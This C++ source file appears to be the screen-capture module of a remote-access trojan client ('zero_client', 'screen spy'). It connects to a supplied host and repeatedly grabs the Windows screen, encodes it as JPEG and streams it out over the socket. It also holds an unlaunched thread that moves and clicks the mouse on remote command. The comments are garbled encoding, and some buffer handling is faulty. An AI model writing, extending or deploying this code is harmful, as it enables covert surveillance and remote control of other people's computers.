#include "Screen.h"



Screen::Screen(char*ip, int port)
{
	int ret = socket.connectToHost(ip, port);
	if (ret == 0)
	{
		//	break;
	}

	/*
	Info myinfo;
	myinfo.host = ip;
	myinfo.port = port;
	HANDLE h;
	h = CreateThread(NULL, 0, readThread, &myinfo, 0, NULL);
	*/

	Sleep(1000);
	char Head[10] = "SCREEN&";
	socket.write(Head);

	char name[1024] = "OPEN_SCREEN";

	char buf[1024] = { 0 };
	string two = socket.read(buf);

	if (name != two)		//�����Ƿ�ΪOPEN_FILE
	{
		return;
	}

	// ��ʼ��������
	const int fps = 18;  // ÿ��֡�ȣ������Լ�����
	do {
		Sleep(1000/fps);

		// ��ȡ��Ļ���ٰ���ת����jpg��ʽ
		std::vector<unsigned char> bmp, jpg;
		
		if (!captureScreen(bmp)) {
			return;
		}
		

		
		unsigned int len = 0;
		if ((len = convertToJpgData(bmp)) == 0) {
			return;
		}
		
		// ��������
		
		int rec = sendScreenData(&socket, len);
		if (rec == false)
		{
			return;
		}
		
		

	} while (1);

	// ���
	std::cout << "Finished screen spy" << std::endl;
}



unsigned int  Screen::convertToJpgData(const std::vector<unsigned char> &bmpData)
{
	// ���������������̲߳��ܽ���
	////EnterCriticalSection(&gCs);

	// ����ͼƬ��С
	unsigned int iByte = 3;
	unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
	unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
	unsigned int iBmpSize = iWidth * iHeigth * iByte;
	if (iWidth == 1366) {
		iWidth = 1360;
	}

	//  ���bitmap��jpg�ă��淽ʽ���෴,����Ҫ�������^��
	//  ����: rgb: 1 2 3  ->  9 8 7
	//            4 5 6  ->  6 5 4
	//            7 8 9  ->  3 2 1
	const unsigned char *bmp = &bmpData[0];
	std::vector<unsigned char> convertedBmp;
	convertedBmp.reserve(iBmpSize);
	unsigned char *cBmp = (unsigned char*)&convertedBmp[0];

	for (unsigned int i = 0, j; i < iHeigth; i++) {
		for (j = 0; j < iWidth; j++) {
			cBmp[i * iWidth *  iByte + j * 3] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 2];
			cBmp[i * iWidth *  iByte + j * 3 + 1] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 1];
			cBmp[i * iWidth *  iByte + j * 3 + 2] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte];
		}
	}

	// ����jpg�ṹ
	struct jpeg_compress_struct jcs;
	struct jpeg_error_mgr jem;

	jcs.err = jpeg_std_error(&jem);
	jpeg_create_compress(&jcs);

	// �����������
	jcs.image_height = iHeigth;
	jcs.image_width = iWidth;
	jcs.input_components = iByte;
	jcs.in_color_space = JCS_RGB;

	jpeg_set_defaults(&jcs);

	// ����ѹ������
	const int quality = 100;     // Խ��Խ�ã�ԽСԽ�������Լ�����
	jpeg_set_quality(&jcs, quality, TRUE);

	// ��������ļ�����ʱ�ļ����ģ�����������ã�
	const std::string fileName = "c:/zero_client_screen_capture.tmp";
	FILE *fp = fopen(fileName.data(), "wb+");
	if (!fp) {
		std::cout << "Failed to create file " << fileName << " error:"
			<< ferror(fp) << std::endl;


		// �����������
		////LeaveCriticalSection(&gCs);
		return 0;
	}

	jpeg_stdio_dest(&jcs, fp);

	// ��ʼѹ��
	jpeg_start_compress(&jcs, TRUE);
//	typedef JSAMPLE *JSAMPROW;
	JSAMPROW jr;
	while (jcs.next_scanline < iHeigth) {
		jr = &cBmp[jcs.next_scanline * iWidth * iByte];
		jpeg_write_scanlines(&jcs, &jr, 1);
	}

	// �ͷ�
	jpeg_finish_compress(&jcs);
	jpeg_destroy_compress(&jcs);
	fclose(fp);

	FILE *fpp = fopen("c:/zero_client_screen_capture.tmp", "r");
	if (!fpp) return -1;
	fseek(fpp, 0L, SEEK_END);
	int size = ftell(fpp);
	fclose(fpp);

	return size;
}

bool Screen::sendScreenData(Socket *sock, unsigned int len)
{
	// ����ͷ��
	int ssszie = len + 1024;
	char *buffer = new char[ssszie];
	memset(buffer, 0, ssszie);

	char sendSize[99] = { 0 };	//�ļ���С
	itoa(ssszie, sendSize, 10);

		char *buff = new char[ssszie];
		memset(buff, 0, ssszie);

	HANDLE pfile;
	pfile = ::CreateFile("c:/zero_client_screen_capture.tmp", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (pfile == INVALID_HANDLE_VALUE)
	{
		cout << "���ļ�ʧ��" << endl;;
		CloseHandle(pfile); // һ��ע���ں����˳�֮ǰ�Ծ�������ͷ�
		return false;
	}
	DWORD readsize;
	ReadFile(pfile, buff, ssszie, &readsize, NULL);

	strncat(buffer, sendSize, strlen(sendSize));
	strncat(buffer, "#", 1);
	memcpy(buffer + (strlen(sendSize) + 1), buff, readsize);

	int overSend = socket.write(buffer, ssszie);
	if (overSend == -1)
	{
		return false;
	}
	CloseHandle(pfile);

	delete[] buffer;
	delete[] buff;
	DeleteFileA("c:/zero_client_screen_capture.tmp");
	buffer = NULL;
	buff = NULL;

	return true;
}
bool Screen::captureScreen(std::vector<unsigned char> &bmpData)
{
	// ���������������̲߳��ܽ���
//	////EnterCriticalSection(&gCs);

	HBITMAP hBitmap;

	// �õ���Ļ�豸
	HDC hScrDC = CreateDCA(_T("DISPLAY"), NULL, NULL, NULL);
	if (!hScrDC) {
		std::cout << "Failed to get screen device" << std::endl;


		// �����������
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// �����µ��豸
	HDC hRamDC = CreateCompatibleDC(hScrDC);
	if (!hRamDC) {
		std::cout << "Failed to create device" << std::endl;


		// �����������
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// ����ͼƬ��С
	unsigned int iByte = 3;
	unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
	unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
	unsigned int iBmpSize = iWidth * iHeigth * iByte;
	if (iWidth == 1366) {
		iWidth = 1360;
	}

	// ����λͼ
	BITMAPINFOHEADER bmpInfoHeader;
	BITMAPINFO bmpInfo;
	void *p;

	bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpInfoHeader.biBitCount = 32;
	bmpInfoHeader.biPlanes = 1;
	bmpInfoHeader.biCompression = BI_RGB;
	bmpInfoHeader.biWidth = iWidth;
	bmpInfoHeader.biHeight = iHeigth;
	bmpInfo.bmiHeader = bmpInfoHeader;

	// ��ȡλͼ
	hBitmap = CreateDIBSection(hScrDC, &bmpInfo, DIB_RGB_COLORS, &p, NULL, 0);
	if (!hBitmap) {
		std::cout << "Failed to CreateDIBSection" << std::endl;


		// �����������
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// ���豸�����
	HBITMAP hBitmapOld;
	hBitmapOld = (HBITMAP)SelectObject(hRamDC, hBitmap);

	// ����Ļ���Ƶ���������豸��
	StretchBlt(hRamDC, 0, 0, iWidth, iHeigth, hScrDC, 0, 0, iWidth, iHeigth, SRCCOPY);

	// ����ͼƬ���ڴ�ռ�
	bmpData.reserve(iBmpSize);
	HDC hTmpDC = GetDC(NULL);
	hBitmap = (HBITMAP)SelectObject(hRamDC, hBitmapOld);

	bmpInfoHeader.biBitCount = 24;
	int iError = GetDIBits(hTmpDC, hBitmap, 0, iHeigth, &bmpData[0], (BITMAPINFO *)&bmpInfoHeader, DIB_RGB_COLORS);
	if (!iError) {
		std::cout << "Failed to GetDIBits" << std::endl;


		// �����������
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// �ͷ��豸�����
	DeleteDC(hScrDC);
	DeleteDC(hRamDC);
	DeleteObject(hBitmapOld);
	DeleteDC(hTmpDC);
	DeleteObject(hBitmap);

	// �����������
//	////LeaveCriticalSection(&gCs);
	return true;
}

Screen::~Screen()
{
}

DWORD WINAPI Screen::readThread(LPVOID pM)
{
	Info *myinfo = (Info*)pM;

	Socket thread;
	int ret = thread.connectToHost(myinfo->host, myinfo->port);
	if (ret == 0)
	{
		//	break;
		return 0;
	}

	Sleep(2000);
	char Head[10] = "MOUSE&";
	thread.write(Head);

	char name[1024] = "OPEN_MOUSE";

	char buf[1024] = { 0 };
	string two = thread.read(buf);

	if (name != two)		//�����Ƿ�ΪOPEN_FILE
	{
		return 0;
	}

	while (1)
	{
		char buf[100];
		thread.read(buf, 100);


		vector<string> list;
	//	string buffer = buf;
	//	const char* cc = buffer.data();
	//	char* dd = const_cast<char*>(cc);

		char *tok = strtok(buf, "#");
		while (tok)
		{
			list.push_back(tok);
			tok = strtok(NULL, "#");
		}

		int ListSize = list.size();
		//	cout << "list size:" << ListSize;
		if (list.size() == 0)
		{
			return 0;
		}

		string head = list.at(0);
		if (head == "press")
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		}
		if (head == "release")
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		if (head == "move")
		{
			if (list.size() < 3)
			{
				return 0;
			}
			char xs[4];
			char ys[4];
			int x = atoi(list.at(1).data());
			int y = atoi(list.at(2).data());
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, x, y, 0, 0);
		}
	}
	return 0;
}

